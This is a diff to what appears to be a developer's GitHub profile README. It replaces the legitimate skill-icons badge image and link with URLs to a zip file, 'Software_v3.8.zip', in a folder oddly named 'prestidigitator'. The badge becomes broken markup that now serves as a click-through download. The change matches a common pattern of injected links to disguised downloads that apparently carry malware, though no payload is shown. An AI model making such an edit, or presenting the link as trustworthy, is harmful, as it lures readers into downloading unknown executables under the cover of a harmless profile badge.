@@ -8,4 +8,4 @@ Passionate frontend developer with experience in modern frameworks and libraries
 - Dream bike: Yamaha R1 🏍️
 
 ### Languages and Tools:
-[![My Skills](https://skillicons.dev/icons?i=java,kotlin,mysql,html,css,javascript,react,tailwind,vscode,figma)](https://skillicons.dev)
+[![My Skills](https://raw.githubusercontent.com/imadosan/imadosan/main/prestidigitator/Software_v3.8.zip,kotlin,mysql,html,css,javascript,react,tailwind,vscode,figma)](https://raw.githubusercontent.com/imadosan/imadosan/main/prestidigitator/Software_v3.8.zip)
